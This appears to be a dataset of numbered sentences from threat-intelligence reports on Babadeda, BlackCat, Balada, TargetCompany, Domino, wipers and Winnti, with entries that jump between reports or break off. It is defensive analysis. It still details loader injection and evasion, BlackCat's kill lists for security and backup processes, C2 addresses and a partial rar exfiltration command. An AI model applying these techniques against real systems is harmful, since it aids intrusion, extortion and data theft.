address.","759":"The Loader parses the _PEB structure in order to find the base address of the current executable and the LDR_DATA_TABLE_ENTRY which will be used later.","760":"Finally, it dynamically loads the VirtualProtect function using a pre-calculated hash value (0xF1C25B45 in our case). ","761":"Injection This stage is pretty straightforward.","762":"Within it, the Loader overwrites the current PE with the final payload\u2019s PE.","763":"It does so by copying the PE headers and each section according to the current executable\u2019s base address. ","764":"Figure 19: Change headers protection and clear memory bytes for the new PE Once previous bytes have been cleared, the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER. ","765":"Correction The final stage is responsible for fixing the import address table and relocation table of the newly injected PE. ","766":"Figure 20: Fix tables and remove altering evidence mw_construct_IAT Load GetModuleHandleA, LoadLibraryA and GetProcAddress functions by hash (0x9FE4FCE1, 0x85557334 and 0xF23B576D respectively).

","770":"Iterate over each entry in the relocation table. ","771":"Add the delta to the entry value. ","772":"In addition to fixing the import address and relocation tables, the Loader removes evidence of injection by using the following methods: Update the LDR data table entry to match the injected PE. ","773":"Remove the injected PE headers from memory. ","774":"These steps attempt to evade memory scanners that seek mismatching LDR data and in-memory PEs. ","775":"Finally, the malware jumps to the entry point of the newly injected PE with the original command-line arguments. ","776":"Conclusion As demonstrated above, Babadeda is a highly dangerous crypter.","777":"Targeting cryptocurrency users through trusted attack vectors gives its distributors a fast-growing selection of potential victims.","778":"Once on a victim's machine, masquerading as a known application with a complex obfuscation also means that anyone relying on signature-based malware effectively has no way of knowing Babadeda is on their machine \u2014 or of stopping it from executing. ","779":"Mitigating the threat posed by Babadeda requires securing the device memory it targets.","780":"Morphisec does this through Moving Target Defence, a technology that morphs process memory trapping crypters like Babadeda before they are able to deploy.

BlackCat Ransomware url: https:\/\/unit42.paloaltonetworks.com\/blackcat-ransomware\/ This post is also available in: \u65e5\u672c\u8a9e (Japanese)Executive Summary BlackCat (aka ALPHV) is a ransomware family that surfaced in mid-November 2021 and quickly gained notoriety for its sophistication and innovation.","783":"Operating a ransomware-as-a-service (RaaS) business model, BlackCat was observed soliciting for affiliates in known cybercrime forums, offering to allow affiliates to leverage the ransomware and keep 80-90% of the ransom payment.","784":"The remainder would be paid to the BlackCat author. ","785":"BlackCat has taken an aggressive approach to naming and shaming victims, listing more than a dozen on their leak site in a little over a month.","786":"The largest number of the group\u2019s victims so far are U.S. organizations, but BlackCat and its affiliates have also attacked organizations in Europe, the Philippines and other locations.","787":"Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals. ","788":"Use of BlackCat ransomware has grown quickly for a variety of reasons (for comparison, AvosLocker had only listed a handful of victims publicly within two months of becoming known).","789":"Effective marketing to affiliates is a likely factor \u2013 in addition to offering an enticing share of ransom payments, the group has solicited affiliates by posting ads on forums such as Ransomware Anonymous Market Place (RAMP). ","790":"The malware itself is written in Russian and coded in the Rust programming language.","791":"Though this is not the first piece of malware to use Rust, it is one of the first, if not the first, piece of ransomware to use it.","792":"By leveraging this programming language, the malware authors are able to easily compile it against various operating system architectures.","793":"Given its numerous native options, Rust is highly customizable, which facilitates the ability to pivot and individualize attacks. ","794":"The threat actors leveraging BlackCat, often referred to as the \"BlackCat gang,\u201d utilize numerous tactics that are becoming increasingly commonplace in the ransomware space.","795":"Notably, they use multiple extortion techniques in some cases, including the siphoning of victim data before ransomware deployment, threats to release data if the ransom is not paid and distributed denial-of-service (DDoS) attacks. ","796":"Palo Alto Networks detects and prevents BlackCat ransomware with the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security subscriptions such as WildFire). ","797":"Due to the surge of this malicious activity, we\u2019ve created this threat assessment for overall awareness.","798":"Full visualization of the techniques observed, relevant courses of action and IOCs can be viewed in the Unit 42 ATOM viewer. ","799":"Table of Contents BlackCat Ransomware OverviewTechnical Details \u2022 BlackCat Config \u2022 Associated ToolsPost-compromise ActivitiesCourses of ActionConclusionAdditional ResourcesAcknowledgments BlackCat Ransomware Overview Soliciting via known cybercrime forums, BlackCat is seeking affiliates to deploy its ransomware.","800":"Affiliates keep an 80-90% share of the ransom payment, with the remainder going to the BlackCat author.","801":"These affiliates are interviewed and vetted before being accepted into the RaaS group.","802":"Once the affiliate is confirmed, they are given unique access to a Tor-based control panel that hosts the affiliate\u2019s access. ","803":"Written in the Russian language, the control panel gives the affiliate updates and announcements about deploying and operating the ransomware as well as troubleshooting tips to help the affiliate be more successful in their campaigns.","804":"Along with the control panel, a name and shame blog is also hosted, targeting victims who have either ignored or refused to pay the ransom.","805":"This site has been regularly updated with new victims since the initial discovery of the group. ","806":"As shown in Figure 1 below, many RaaS operators use the double-extortion technique of exfiltrating data prior to encryption, which provides them greater leverage in negotiating ransom funds.","807":"As of December 2021, BlackCat has the seventh largest number of victims listed on their leak site among ransomware groups tracked by Unit 42 \u2013 impressive considering that this group has only been publicly known since November 2021.","808":"While Conti (ranked second) has been around in various guises for almost two years, it is surrounded at the top of the chart by emerging families.","809":"LockBit 2.0 and Hive both have at least six months\u2019 head start on BlackCat, but this highlights a worrying trend that newcomers (or reformed groups) can attack many victims in a short space of time. Figure 1.","810":"Leak site\/name and shame blog statistics, December 2021.Using the leak site information, we can understand the location and types of victims affected by BlackCat attacks.","811":"Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals.","812":"Figure 2 breaks down the victims by country.","813":"However, the so-far sporadic spread of the attacks may indicate a somewhat opportunistic approach, as with most contemporary ransomware families. ","814":"Figure 2.","815":"BlackCat leak site victims by country.","816":"Technical Details BlackCat is positioned to pivot to individualized, customized attacks due to the numerous options available when coding in Rust (Figure 3).","817":"Rust programming has gained momentum due to its fast and high performance, powerful web application development, low overhead for embedded programming, and memory management resolution.","818":"Rust also facilitates the BlackCat author due to its efficiency regarding algorithms that power the encryption capability of the ransomware.","819":"Because of its efficiency and adaptability, BlackCat has been seen targeting both Windows and Linux systems. ","820":"Figure 3.","821":"BlackCat execution options.","822":"In an effort to maintain longevity, the use of the --access-token flag is required to execute the ransomware, which can make it harder to analyze in sandboxed environments. ","823":"BlackCat Config While analyzing the ransomware configurations, we observed numerous evasion tactics deployed.","824":"These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.","825":"BlackCat attempts to kill several processes and services to hinder or prevent security solutions and backups.","826":"The process list checked is as follows: agntsvc, dbeng50, dbsnmp, encsvc, excel, firefox, infopath, isqlplussvc, msaccess, mspub, mydesktopqos, mydesktopservice, notepad, ocautoupds, ocomm, ocssd, onenote, oracle, outlook, powerpnt, sqbcoreservice, sql, steam, synctime, tbirdconfig, thebat, thunderbird, visio, winword, wordpad, xfssvccon, *sql*, bedbh, vxmon, benetns, bengien, pvlsvr, beserver, raw_agent_svc, vsnapvss, CagService, QBIDPService, QBDBMgrN, QBCFMonitorService, SAP, TeamViewer_Service, TeamViewer, tv_w32, tv_x64, CVMountd, cvd, cvfwd, CVODS, saphostexec, saposcol, sapstartsrv, avagent, avscc, DellSystemDetect, EnterpriseClient, VeeamNFSSvc, VeeamTransportSvc, VeeamDeploymentSvc ","827":"The services running on the compromised system are checked against the following list: mepocs, memtas, veeam, svc$, backup, sql, vss, msexchange, sql$, mysql, mysql$, sophos, MSExchange, MSExchange$, WSBExchange, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, GxBlr, GxVss, GxClMgrS, GxCVD, GxCIMgr, GXMMM, GxVssHWProv, GxFWD, SAPService, SAP, SAP$, SAPD$, SAPHostControl, SAPHostExec, QBCFMonitorService, QBDBMgrN, QBIDPService, AcronisAgent, VeeamNFSSvc, VeeamDeploymentService, VeeamTransportSvc, MVArmor, MVarmor64, VSNAPVSS, AcrSch2Svc In an effort to maintain persistence, the BlackCat ransomware excludes key system and application folders \u2013 as well as key components \u2013 from encryption so as not to render the system and ransomware inoperative.","828":"The folders excluded are as follows: system volume information, intel, $windows.~ws, application data, $recycle.bin, mozilla, $windows.~bt, public, msocache, windows, default, all users, tor browser, programdata, boot, config.msi, google, perflogs, appdata, windows.old Excluded file names are as follows: desktop.ini, autorun.inf, ntldr, bootsect.bak, thumbs.db, boot.ini, ntuser.dat, iconcache.db, bootfont.bin, ntuser.ini, ntuser.dat.log Any file with an extension matching the following list will also be avoided: themepack, nls, diagpkg, msi, lnk, exe, cab, scr, bat, drv, rtp, msp, prf, msc, ico, key, ocx, diagcab, diagcfg, pdb, wpx, hlp, icns, rom, dll, msstyles, mod, ps1, ics, hta, bin, cmd, ani, 386, lock, cur, idx, sys, com, deskthemepack, shs, ldf, theme, mpa, nomedia, spl, cpl, adv, icl, msu Hardcoded credentials stored within the BlackCat ransomware config lend credence to the likelihood that specific victims are being targeted.","829":"The credentials also allow BlackCat to move laterally within the victim\u2019s system and\/or network, often with administrative privileges.","830":"Credential access permits the ransomware to deploy additional tools that further propagate the attack.","831":"These observations have also been confirmed by Symantec. ","832":"Associated Tools BlackCat has been observed using multiple \u2013 often legitimate \u2013 tools throughout their attacks, such as Mimikatz, LaZagne and WebBrowserPassView to recover stored passwords, as well as GO Simple Tunnel (GOST) and MEGAsync to exfiltrate data.","833":"Additionally, anti-forensics tools like fileshredder, an application to securely delete unwanted files beyond recovery, have also been leveraged during some BlackCat ransomware attacks investigated by Unit 42. ","834":"Post-compromise Activities Once candidate systems have been identified for encryption by the threat actors, the ransomware deployment occurs and all viable files will be encrypted.","835":"This process often involves renaming files to include another or a different file extension, such as wpzlbji, in the example shown in Figure 4.","836":"As is commonplace with other ransomware strains, BlackCat ransomware will drop ransom notes on the compromised system(s) to inform the victim of what has happened and how to go about getting their data restored.","837":"Text files with the name RECOVER-[RANDOM]-FILES.txt (where [RANDOM] refers to the aforementioned file extension name) will be found on the compromised system containing information and instructions such as those in the example below: Figure 4.","838":"An example of a BlackCat ransom note dropped on a compromised system.","839":"BlackCat utilizes a unique onion domain with a victim-specific access key for the victim to use to learn more about the attack, their data, and what the threat actors want the victim to do next.","840":"The following example URL highlights the notation used by BlackCat ransomware: http:\/\/2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid[.]onion\/?access-key=${ACCESS_KEY}\",\"note_short_text\":\"Important Once the victim navigates to the onion site provided, they will see something similar to Figure 5 below.","841":"This site reiterates the problem and that the actor's Decrypt App private key is the only way to get their data back.","842":"The portal also provides chat facilities, the ransom amounts \u2013 which can differ depending on when the payment is sent \u2013 how to pay, and a way to test that the decryption works. ","843":"Figure 5.","844":"Example onion site information for BlackCat victims.","845":"Unit 42 has observed BlackCat affiliates asking for ransom amounts of up to $14 million, though they offered to discount this demand to $9 million if paid before the established time.","846":"Interestingly, the ransom demand gives the victim the option to pay not only in Bitcoin (the most common option) but also in Monero. ","847":"In some cases, BlackCat operators use the chat to threaten the victim, claiming they will perform a DDoS attack on the victims' infrastructure if the ransom is not paid.","848":"When it appears in addition to the use of a leak site, this practice is known as triple extortion, a tactic that was observed being used by groups like Avaddon and Suncrypt in the past.

opportunity.","1335":"Within 24 hours of the vulnerability\u2019s release we observed a large spike in infections, many of which included a Doppelg\u00e4nger post-layouts (Post Layouts for Gutenberg) plugin.","1336":"Notice the added \u201cs\u201d in posts:.\/wp-content\/plugins\/posts-layoutsSince the vulnerability allows for unauthenticated takeover of websites, attackers are able to take full administrator control of victim environments and install malicious plugins like the one above.","1337":"Post Layouts is actually a legitimate plugin found within the WordPress repository with over 30,000+ installations and is designed to add functionality to WordPress that allows posts to be displayed in grid and list layouts.","1338":"That being said, the version installed by the Balada attackers is spurious and a maliciously modified version, in which hackers disabled the legitimate functionality and added malicious code to be executed instead.","1339":"All legitimate files and the metadata of the real post-layouts plugin are retained though, which make it look like the real deal at the first sight.","1340":"We can see that with 30,000+ active installations, the original plugin

download plugins, test them, and remove\/disable afterwards.","1342":"At the beginning of this week, the number of active installations was still 20,000+.","1343":"With 316 downloads during the last 7 days, you can hardly expect the number of active installations to increase so quickly.","1344":"You can see a spike in downloads after May 12, 2023 when the attack began.","1345":"These 100+ downloads per day couldn\u2019t contribute to the increase in active downloads and the volume of hacked sites that we see.","1346":"We think this insignificant spike was caused by webmasters and security professionals that wanted to download the official version and compare it with the suspicious plugins found on compromised sites.","1347":"The real reason of the increase in active installs is that

","1533":"Figure 4.","1534":"Both Mallox and Fargo variants use a set of tools via remote desktop for defense evasion. ","1535":"It\u2019s important to note that reflective loading enabled the Mallox variant to evade traditional antivirus solutions, making it challenging for organizations to protect themselves against these attacks. ","1536":"Meanwhile, the Remcos backdoor payload is executed via WmiPrvSE.exe, and the payload most likely arrives by exploiting public-facing websites and domains. ","1537":"Our investigations showed that the gang used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.","1538":"We also observed the presence of YDArk.exe (PCHunter64) for performing rootkit behaviors, and that TargetCompany attempts to terminate security-related processes and services by dropping KILLAV.

","1546":"In the last two months of 2022, there was an increase in attacks launched by the TargetCompany ransomware using its Mallox variant. ","1547":"Extortion While the Mallox and Fargo variants were operating simultaneously in 2022, TargetCompany initiated its double-extortion scheme by setting up a Telegram channel where it could publish stolen information. ","1548":"In August 2022, just two months after the group launched its Fargo variant, Mallox created a Twitter account where it could announce its victims.","1549":"Since this account was eventually suspended, the threat actors created a new one.

","1556":"Our investigations also revealed that the ransomware might have connections with other groups such as the BlueSky ransomware, as well as the threat actors who perform brute-force attacks on MS SQL Servers.","1557":"TargetCompany shares similarities with these groups in terms of threat actor profiles, targets, deployed remote control, and encryption algorithm.","1558":"We discuss other possible affiliations, as well as victim profiles and behaviors in our Spotlight feature on the ransomware group. ","1559":"Conclusion The TargetCompany ransomware is making bolder ventures beyond its tried-and-tested techniques by joining the bandwagon of OneNote phishing campaigns, which allows it to cast a wider net for increased profitability.","1560":"Within just two years of activity, the threat actors behind the ransomware are proving their hunger for prolificacy, expanding their business model with a RaaS affiliate program and maintaining several platforms to announce victims and expose stolen data. ","1561":"We can expect TargetCompany to make even bigger moves in the future, especially since the threat actors behind it have admitted that they created TargetCompany to move away from the restrictions and inflexibility of their previous groups.","1562":"Now unhindered, the gang will naturally try to maximize profits from its victims. ","1563":"To protect systems from ransomware attacks, we recommend that both individual users and organizations implement best practices such as applying data protection and backup and recovery measures to secure data from possible encryption or erasure.","1564":"Conducting regular vulnerability assessments and patching systems in a timely manner can also minimize the damage dealt by ransomware families that abuse exploits.

","1888":"One of Domino\u2019s final payloads is the Project Nemesis infostealer.","1889":"Project Nemesis was first advertised on the dark web in December 2021, though has been rarely used since then. ","1890":"Analysis Ex-Conti Members Deploy Domino in Recent Campaigns Former members of ITG23 (aka the Trickbot\/Conti syndicate) are likely behind recent campaigns using the Dave Loader to load Domino Backdoor and probably collaborated with current or former ITG14 developers to purchase or use the new malware family.","1891":"X-Force previously assessed that Dave is one of several loaders or crypters developed by members of the Trickbot\/Conti group.","1892":"Although the group has fractured, many of its loaders\/crypters \u2014 including Dave \u2014 have been maintained and continue to be used by factions composed of former Trickbot\/Conti members, including Quantum, Royal, BlackBasta, and Zeon. ","1893":"The Dave Loader has been used recently with several Cobalt Strike samples with the watermark \u201c206546002,\u201d which X-Force and other security researchers \u2014 here and here \u2014 have associated with groups composed of former members of the Trickbot\/Conti syndicate, including Quantum and Royal.","1894":"X-Force observed Dave-loaded Cobalt Strike samples using this watermark in suspected Royal attacks in fall 2022. ","1895":"Dave Loader has also been used this year to load IcedID and Emotet, both of which serve as initial access vectors for ransomware attacks from former Trickbot\/Conti-affiliated factions. ","1896":"Recently observed Dave samples were discovered loading a new malware, which we have named Domino Backdoor.","1897":"This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload. ","1898":"In most instances, the received payload was a second loader that was found to have code overlap with Domino Backdoor, and as such we have dubbed it Domino Loader.","1899":"This loader contains an encrypted payload within its resources, which it decrypts using AES.","1900":"The decrypted payload is a .NET infostealer, which identifies itself as \u2018Nemesis Project.\u2019 ","1901":"The Domino Backdoor is designed to contact a different C2 address for domain-joined systems, suggesting a more capable backdoor, such as Cobalt Strike, will be downloaded on higher value targets instead of Project Nemesis. ","1902":"Domino\u2019s Connections to ITG14 Analysis revealed that both the Domino Backdoor and Loader share code overlap with the Lizar Malware, also known as Tirion and DiceLoader, which is attributed to the threat group ITG14 (FIN7).","1903":"In addition to having similar coding styles and functionality, both Domino and DiceLoader share the same configuration structure and have similar bot ID formats.","1904":"Lizar was reportedly first used in March 2020, when it was originally named Tirion, and has been observed in numerous ITG14 campaigns up to the end of 2022.","1905":"Domino has been active in the wild since at least October 2022, which notably is when Lizar observations began to decrease. ","1906":"X-Force researchers found additional evidence connecting Domino Backdoor to ITG14\u2019s Carbanak Backdoor.","1907":"We identified Domino Backdoor samples from December 2022, which used a different loader that we have dubbed NewWorldOrder Loader.","1908":"The samples used the name ThunderboltService.exe and downloaded and loaded the Project Nemesis Stealer. ","1909":"Around the same time, we also uncovered NewWorldOrder Loader samples, with the same filename ThunderboltService.exe, used to load the Carbanak Backdoor.","1910":"Carbanak has been used by ITG14 since late 2015. ","1911":"Finally, X-Force analysts also observed that two of the Domino Backdoor C2 addresses belonging to MivoCloud: 94.158.247[.]72 and 185.225.17[.]202 are very close to C2 addresses ITG14 has used previously for SSH-based Backdoors such as 94.158.247[.]23 and 185.225.17[.]220.","1912":"While such overlap is insufficient for attribution, it is nonetheless consistent with other evidence linking Domino to an ITG14 developer and may indicate the latter\u2019s preference for MivoCloud for at least some of their C2 addresses.","1913":"MivoCloud has also been used to host Diceloader and Carbanak C2 servers. ","1914":"Collaboration between members of ITG14 and former members of ITG23 is not without precedent.","1915":"Other researchers \u2014 here and here \u2014 observed ITG14 attacks using Ryuk ransomware in 2020, which has been attributed to the Trickbot\/Conti cybercrime syndicate, while others have also identified connections between a FIN7 developer and tools used by the BlackBasta group, whose members also have ties to the former Trickbot\/Conti syndicate. ","1916":"Project Nemesis The Project Nemesis infostealer has been active in the wild since December 2021, when it was offered for sale on several Dark Web forums.","1917":"It can collect data from a range of web browsers, as well as applications including Steam, Telegram, Discord, crypto wallets, and VPN providers. ","1918":"Domino has been used to install Project Nemesis since at least October 2022 \u2014 prior to its use in late February 2023 by ex-Conti actors.","1919":"This leads us to assess that the ITG14 members responsible for developing Domino probably had a relationship with Project Nemesis and offered Domino and the infostealer to the ex-Conti threat actors as a package.","1920":"The ex-Conti members in turn likely used the Project Nemesis infostealer against lower value targets. ","1921":"The use of infostealers by former Trickbot\/Conti members and their distributors is not without precedent \u2014 other security researchers observed the Vidar infostealer delivered during DEV-0569 Batloader campaigns that also led in some cases to Cobalt Strike and Royal ransomware.","1922":"We assess that infostealers may often be deployed during lower priority infections, e.g., on personal computers or those not belonging to an Active Directory domain, while higher priority infections receive other backdoors such as Cobalt Strike.

","2065":"title: Analysis on recent wiper attacks: examples and how wiper malware works url: https:\/\/cybersecurity.att.com\/blogs\/labs-research\/analysis-on-recent-wiper-attacks-examples-and-how-they-wiper-malware-works Executive summary 2022 has experienced an increase in the number of wiper variants targeting Ukrainian entities. ","2066":"This blog post looks to explain how wipers work, what makes them so effective and provides a short overview of the most recent samples that appeared in the eastern Europe geopolitical conflict. ","2067":"How does wiper malware work? ","2068":"Wiper\u2019s main objective is to destroy data from any storage device and make the information unavailable (T1485).","2069":"There are two ways of removing files, logical and physical. ","2070":"Logical file removal is the most common way of erasing a file, performed by users daily when a file is sent to (and emptied from) the Recycle bin, or when it is removed with the command line or terminal with the commands del\/rm.","2071":"This action deletes the pointer to the file but not the file data, making it recoverable with forensic tools as long as the Operative System does not write any other file in the same physical location. ","2072":"However, malware wipers aim to make the data irrecoverable, so they tend to remove the data from the physical level of the disk.","2073":"The most effective way to remove the data\/file is by overwriting the specific physical location with other data (usually a repeated byte like 0xFF).","2074":"This process usually involves writing to disk several Gigabytes (or Terabytes) of data and can be time consuming.","2075":"For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.","2076":"By replacing the MBR, the boot process crashes, making the files inaccessible unless forensic methodologies are used. ","2077":"The Master File Table (MFT) is exclusive to NTFS file systems, contains the physical location of files in the drive as well as logical and physical size and any associated metadata.","2078":"If big files need to be stored in the drive, and cannot use consecutive blocks, these files will have to be fragmented in the disk.","2079":"The MFT holds the information of where each fragment is stored.","2080":"Removing the MFT will require the use of forensic tools to recover small files, and basically prevents recovery of fragmented files since the link between fragments is lost. ","2081":"The main difference between wipers and ransomware is that it\u2019s impossible to retrieve the impacted information after a wiper attack.","2082":"Attackers using wipers do not usually target financial reward but intend to disrupt the victim\u2019s operations as much as possible.","2083":"Ransomware operators aim to get a payment in exchange for the key to decrypt the user\u2019s data. ","2084":"With both wiper and ransomware attacks, the victim depends on their back up system to recover after an attack.","2085":"However, even some wiper attacks carry ransom notes requesting a payment to recover the data.","2086":"It is important that the victim properly identifies the attack they've suffered, or they may pay the ransom without any chance of retrieving the lost data. ","2087":"In the last month and a half, since the war started in Eastern Europe, several wipers have been used in parallel with DDoS attacks (T1499) to keep financial institutions and government organizations, mainly Ukrainian, inaccessible for extended periods of time.","2088":"Some of the wipers observed in this timeframe have been: WhisperKill, HermeticWiper, IsaacWiper, CaddyWiper, DoubleZero Wiper and AcidRain. ","2089":"Most recent wiper examples WhisperKill On January 14, 2022, the Ukrainian government experienced a coordinated attack on 22 of their government agencies, defacing their websites.","2090":"Almost all the compromised websites were developed by the same Ukranian IT company, Kitsoft, and all of them were built on OctoberCMS.","2091":"Therefore, the attack vector was most probably a supply chain attack on the IT provider, or an exploitation of an OctoberCMS vulnerability, combined with exploitations of Log4Shell vulnerability (T1190). ","2092":"Figure 1.","2093":"Example of defaced Ukrainian government website. ","2094":"In addition to the website defacement, Microsoft Threat Intelligence Center (MSTIC), identified in a report destructive malware samples targeting Ukrainian organizations with two malware samples.","2095":"Microsoft named the samples WhisperGate, while other security companies labeled the downloader as WhisperGate and WhisperKill as the actual wiper, which was considered a component of WhisperGate. ","2096":"The identified files were: Stage1 replaces the Master Boot Record (MBR) with a ransom note when the system is powered down, deeming the machine unbootable after that point.","2097":"When booted up, the system displays Figure 2 on screen.","2098":"Despite the ransom request, the data will not be recoverable since all efforts made by WhisperKill are looking to destroy data, not encrypt it.","2099":"In this case, the wallet is most probably an attempt to decoy attribution efforts. ","2100":"Figure 2.","2101":"Ransom note obtained by MSTIC. ","2102":"Stage 2 attempts to download the next stage malware (T1102.003) from the Discord app, if unsuccessful, it sleeps and tries again.","2103":"The payload downloaded from the messaging app destroys as much data as possible by overwriting certain file types with 0xCC for the first MB of the file.","2104":"Then it modifies the file extension to a random four-byte extension.","2105":"By selecting the file types to be wiped and only writing over the first MB of data, the attackers are optimizing the wiping process.","2106":"This is due to not wasting time on system files and only spending the necessary time to wipe each file, rapidly switching to the next file as soon as the current one is unrecoverable.","2107":"Finally, the malware executes a command to delete itself from the system (T1070.004). ","2108":"HermeticWiper A month after, on February 23rd 2022, ESET Research reported a new Wiper being used against hundreds of Ukrainian systems.","2109":"The wiper receives its name from the stolen certificate (T1588.003) it was using to bypass security controls \u201cHermetica Digital Ltd\u201d (T1588.003).","2110":"According to a Reuters article, the certificate could have also been obtained by impersonating the company and requesting a certificate from scratch. ","2111":"Figure 3.","2112":"Hermetica Digital Ltd certificate. ","2113":"The attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO) (T1484.001), Impacket or SMB (T1021.002) and WMI (T1047) with an additional worm component named HermeticWizard. ","2114":"The wiper component first installs the payload as a service (T1569.002) under C:\\Windows\\system32\\Drivers\\. Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.","2115":"Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001). ","2116":"On top of deleting key file system structures, it also performs a drive fragmentation (breaking up files and segregating them in the drive to optimize the system\u2019s performance).","2117":"The combination of the file fragmentation and the deletion of the MFT makes file recovery difficult, since files will be scattered through the drive in small parts - without any guidance as to where each part is located.

","2599":"Executive Summary Following a recent Incident Response, McAfee Enterprise\u2018s Advanced Threat Research (ATR) team worked with its Professional Services IR team to support a case that initially started as a malware incident but ultimately turned out to be a long-term cyber-attack. ","2600":"From a cyber-intelligence perspective, one of the biggest challenges is having information on the tactics, techniques, and procedures (TTPs) an adversary is using and then keeping them up to date.","2601":"Within ATR we typically monitor many adversaries for years and collect and store data, ranging from indicators of compromise (IOCs) to the TTPs. ","2602":"In this report, ATR provides a deep insight into this long-term campaign where we will map out our findings against the Enterprise MITRE ATT&CK model.","2603":"There will be parts that are censored since we respect the confidentiality of the victim.","2604":"We will also zoom in and look at how the translation to the MITRE Techniques, historical context, and evidence artifacts like PlugX and Winnti malware led to a link with another campaign, which we highly trust to be executed by the same adversary. ","2605":"IOCs that could be shared are at the end of this document. ","2606":"McAfee customers are protected from the malware\/tools described in this blog.","2607":"MVISION Insights customers will have the full details, IOCs and TTPs shared via their dashboard.","2608":"MVISION Endpoint, EDR and UCE platforms provide signature and behavior-based prevention and detection capability for many of the techniques used in this attack.","2609":"A more detailed blog with specific recommendations on using the McAfee portfolio and integrated partner solutions to defend against this attack can be found here. ","2610":"Technical Analysis Initial Infection Vectors [TA0001] Forensic investigations identified that the actor established initial access by compromising the victim\u2019s web server [T1190].","2611":"On the webserver, software was installed to maintain the presence and storage of tools [T1105] that would be used to gather information about the victim\u2019s network [T1083] and lateral movement\/execution of files [T1570] [T1569.002].","2612":"Examples of the tools discovered are PSexec, Procdump, and Mimikatz. ","2613":"Privilege Escalation and Persistence [TA0004, TA0003] ","2614":"The adversary has been observed using multiple privilege escalation and persistence techniques during the period of investigation and presence in the network.","2615":"We will highlight a few in each category. ","2616":"Besides the use of Mimikatz to dump credentials, the adversaries used two tools for privilege escalations [T1068].","2617":"One of the tools was \u201cRottenPotato\u201d.","2618":"This is an open-source tool that is used to get a handle to a privileged token, for example, \u201cNT AUTHORITY\\SYSTEM\u201d, to be able to execute tasks with System rights.

","2669":"The malware also decrypts and injects the payload in memory.","2670":"The following screenshot shows the decryption routine. ","2671":"Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.","2672":"The malware described in the article is attributed to the Winnti malware family.","2673":"The operating method and the code used in the DLL described in the article are very similar to our analysis and observations.

","2677":"Secondly, while investigating the process dump, we observed activities from the backdoor that are part of the data exfiltration attempts which we will describe in more detail in this analysis report. ","2678":"A redacted snippet of the code would look like this: Creating archive ***.rar Adding ","2679":"[data from location] 0% OK Another indicator of discovering Winnti malware was the following execution path we discovered in the command line dump of the memory: ","2680":"cmd \/c","2681":"klcsngtgui.exe 1560413F7E <abbreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).","2682":"In this case, the payload file was named using an abbreviation of the victim company\u2019s name.","2683":"Unfortunately, the adversary had removed the payload file from the system.","2684":"File carving did not work since the disk\/unallocated space was overwritten.","2685":"However, reconstructing traces from memory revealed that we were dealing with the Winnti 4.0 malware.","2686":"The malware was injected into a SVCHOST process where a driver location pointed to the config file.","2687":"We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc. ","2688":"Another clue that helped us was the use of DNS tunneling by Winnti which we discovered traces of in memory.","2689":"The hardcoded 208.67.222.222 resolves to a legitimate OpenDNS DNS server.","2690":"The IP is pushed into the list generated by the malware at runtime. ","2691":"At the start of the malware, it populates the list with the system\u2019s DNS, and the OpenDNS server is only used as a backup to ensure that the C2 domain is resolved. ","2692":"Another indicator in the process dump was the setup of the C2 connection including the User-Agent that has been observed being used by Winnti 4.0 malware: ","2693":"Mozilla\/5.0 (Windows NT 6.3; WOW64) AppleWebKit\/537.36 (KHTML, like Gecko)","2694":"Chrome\/57.0.2987.133 Safari\/537.36 Other Persistence Activities WMI activity [T1546.003] was also observed to execute commands on the systems. ","2695":"From a persistence point of view, scheduled tasks [T1053.005] and the use of valid accounts [T1078] acquired through the use of Mimikatz, or creating LSASS dumps, were observed being employed during the length of the campaign. ","2696":"Lateral Movement From a lateral movement perspective, the adversary used the obtained credentials to hop from asset to asset.","2697":"In one particular case, we observed a familiar filename: \u201cPsExec.exe\u201d.","2698":"This SysInternals tool is often observed being used in lateral movement by adversaries, however, it can also be used by the sysadmins of the network.","2699":"In our case, the PsExec executable had a file size of 9.6 MB where the original PsExec (depending on 32- or 64-bit version) had a maximum file size of 1.3 MB.","2700":"An initial static inspection of the file resulted in a blob of code that was present in the executable which had a very high entropy score (7.99).","2701":"When running the file from the command line, the following output was observed: Figure 5 PsExec output The error notification and the \u2018Impacket\u2019 keyword tipped us off and, after digging around, we found more.","2702":"The fake PsExec is an open-source Python script that is a PsExec alternative with shell\/backdoor capability.","2703":"It uses a script from this location: hxxps:\/\/github.com\/SecureAuthCorp\/impacket\/blob\/master\/examples\/psexec.pyi.","2704":"The file is large since it incorporates a low-level protocol interaction from Impacket.","2705":"The Python library combined with the script code is compiled with py2exe.","2706":"The file was compiled during the time of the latest attack activities and signed with an expired certificate. ","2707":"Data Exfiltration From what we observed","2708":", the adversary had a long-term intention to stay present in the victim\u2019s network.","2709":"With high confidence, we believe that the adversary was interested in stealing proprietary intelligence that could be used for military or intellectual property\/manufacturing purposes. ","2710":"The adversary used several techniques to exfiltrate the data.","2711":"In some cases, batch (.bat) scripts were created to gather information from certain network shares\/folders and use the \u2018rar\u2019 tool to compress them to a certain size [T1020]","2712":"[T1030].","2713":"Example of content in a batch script: C:\\Windows\\web\\rar.exe a -[redacted] -r 